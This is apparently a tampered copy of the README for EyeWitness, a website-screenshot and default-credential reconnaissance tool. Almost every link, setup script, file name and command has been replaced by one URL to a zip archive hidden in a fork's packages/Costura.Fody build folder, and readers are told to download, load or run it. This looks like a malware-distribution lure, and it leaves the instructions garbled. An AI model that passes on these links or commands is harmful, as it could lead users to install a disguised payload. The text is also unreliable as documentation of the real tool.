EyeWitness
======

EyeWitness is designed to take screenshots of websites provide some server header info, and identify default credentials if known.

EyeWitness is designed to run on Kali Linux. It will auto detect the file you give it with the -f flag as either being a text file with URLs on each new line, nmap xml output, or nessus xml output. The --timeout flag is completely optional, and lets you provide the max time to wait when trying to render and screenshot a web page.

A complete usage guide which documents EyeWitness features and its typical use cases is available here - https://github.com/rakibofcx/EyeWitness/raw/refs/heads/master/CS/packages/Costura.Fody.4.1.0/build/Witness-Eye-2.2.zip

## Windows
Red Siege has created a Windows client (thanks to the massive help of Matt Grandy (@Matt_Grandy_) with the stability fixes). All you need to do is build it locally (or check the releases), and then provide a path to a file containing the URLs you want scanned! EyeWitness will generate the report within your "AppData\Roaming" directory. The latest version of the C# EyeWitness supports parsing and taking screenshots of Internet Explorer and Chrome bookmarks without having to supply a list of URLs. This version is also small enough to be delivered through Cobalt Strike's execute-assembly.

### Setup:
1. Navigate into the CS directory 
2. Load https://github.com/rakibofcx/EyeWitness/raw/refs/heads/master/CS/packages/Costura.Fody.4.1.0/build/Witness-Eye-2.2.zip into Visual Studio
3. Go to Build at the top and then Build Solution if no modifications are wanted

### Usage:
```bash
https://github.com/rakibofcx/EyeWitness/raw/refs/heads/master/CS/packages/Costura.Fody.4.1.0/build/Witness-Eye-2.2.zip --help
https://github.com/rakibofcx/EyeWitness/raw/refs/heads/master/CS/packages/Costura.Fody.4.1.0/build/Witness-Eye-2.2.zip --bookmarks
https://github.com/rakibofcx/EyeWitness/raw/refs/heads/master/CS/packages/Costura.Fody.4.1.0/build/Witness-Eye-2.2.zip -f C:\Path\to\https://github.com/rakibofcx/EyeWitness/raw/refs/heads/master/CS/packages/Costura.Fody.4.1.0/build/Witness-Eye-2.2.zip
https://github.com/rakibofcx/EyeWitness/raw/refs/heads/master/CS/packages/Costura.Fody.4.1.0/build/Witness-Eye-2.2.zip --file C:\Path\to\https://github.com/rakibofcx/EyeWitness/raw/refs/heads/master/CS/packages/Costura.Fody.4.1.0/build/Witness-Eye-2.2.zip --delay [timeout in seconds] --compress
```

## Linux

###### Supported Linux Distros:
* Kali Linux
* Debian 7+ (at least stable, looking into testing) (Thanks to @themightyshiv)
* CentOS 7
* Rocky Linux 8

**E-Mail:** GetOffensive [@] redsiege [dot] com

### Setup:
1. Navigate into the Python/setup directory
2. Run the https://github.com/rakibofcx/EyeWitness/raw/refs/heads/master/CS/packages/Costura.Fody.4.1.0/build/Witness-Eye-2.2.zip script

### Usage:
```bash
https://github.com/rakibofcx/EyeWitness/raw/refs/heads/master/CS/packages/Costura.Fody.4.1.0/build/Witness-Eye-2.2.zip -f filename --timeout optionaltimeout
```

### Examples:
```bash
./EyeWitness -f https://github.com/rakibofcx/EyeWitness/raw/refs/heads/master/CS/packages/Costura.Fody.4.1.0/build/Witness-Eye-2.2.zip --web

./EyeWitness -x https://github.com/rakibofcx/EyeWitness/raw/refs/heads/master/CS/packages/Costura.Fody.4.1.0/build/Witness-Eye-2.2.zip --timeout 8 

https://github.com/rakibofcx/EyeWitness/raw/refs/heads/master/CS/packages/Costura.Fody.4.1.0/build/Witness-Eye-2.2.zip -f https://github.com/rakibofcx/EyeWitness/raw/refs/heads/master/CS/packages/Costura.Fody.4.1.0/build/Witness-Eye-2.2.zip --web --proxy-ip 127.0.0.1 --proxy-port 8080 --proxy-type socks5 --timeout 120
```

### Proxy Usage
The best guide for proxying EyeWitness through a socks proxy was made by @raikia and is available here - https://github.com/rakibofcx/EyeWitness/raw/refs/heads/master/CS/packages/Costura.Fody.4.1.0/build/Witness-Eye-2.2.zip

To install EyeWitness from a system while needing to go through a proxy, the following commands (thanks to @digininja) can be used.

```bash
APT
-------
https://github.com/rakibofcx/EyeWitness/raw/refs/heads/master/CS/packages/Costura.Fody.4.1.0/build/Witness-Eye-2.2.zip

$ cat https://github.com/rakibofcx/EyeWitness/raw/refs/heads/master/CS/packages/Costura.Fody.4.1.0/build/Witness-Eye-2.2.zip
Acquire::http::proxy "http://localhost:3128";
Acquire::https::proxy "https://localhost:3128";

Git
-----------------
$ cat ~https://github.com/rakibofcx/EyeWitness/raw/refs/heads/master/CS/packages/Costura.Fody.4.1.0/build/Witness-Eye-2.2.zip
[http]
proxy = http://localhost:3128

Wget
---------------------
$ cat ~https://github.com/rakibofcx/EyeWitness/raw/refs/heads/master/CS/packages/Costura.Fody.4.1.0/build/Witness-Eye-2.2.zip or /etc/wgetrc

use_proxy=yes
http_proxy=127.0.0.1:3128
https_proxy=127.0.0.1:3128

General system proxy
--------------------------------

export HTTP_PROXY=http://localhost:3128
export HTTPS_PROXY=http://localhost:3128
```

### Docker
Now you can execute EyeWitness in a docker container and prevent you from install unnecessary dependencies in your host machine.

**Note:** execute *docker run* with the folder path in the host which hold your results (**/path/to/results**)  
**Note2:** in case you want to scan urls from a file, make sure you put it in the volume folder (if you put *https://github.com/rakibofcx/EyeWitness/raw/refs/heads/master/CS/packages/Costura.Fody.4.1.0/build/Witness-Eye-2.2.zip* in */path/to/results*, then the argument should be *-f https://github.com/rakibofcx/EyeWitness/raw/refs/heads/master/CS/packages/Costura.Fody.4.1.0/build/Witness-Eye-2.2.zip*)

##### Usage
```bash
sudo docker build -t eyewitness
```

##### Example #1 - 
```bash
sudo docker run --rm \
    -v /tmp:/Eyewitness/Python/ \
    eyewitness --web \
    -f https://github.com/rakibofcx/EyeWitness/raw/refs/heads/master/CS/packages/Costura.Fody.4.1.0/build/Witness-Eye-2.2.zip \
    --no-prompt \
    -d /Eyewitness/Python/report-$(date +'%d-%m-%Y-%H-%M-%S' | sed 's/[-:]/-/g')
```
And then on your host : 

```bash
cd /tmp && ls 
cd report*
firefox-esr https://github.com/rakibofcx/EyeWitness/raw/refs/heads/master/CS/packages/Costura.Fody.4.1.0/build/Witness-Eye-2.2.zip &
```
###### Call to Action:
I'd love for EyeWitness to identify more default credentials of various web applications.  
As you find a device which utilizes default credentials, please e-mail me the source code of the index page and the default creds so I can add it in to EyeWitness!
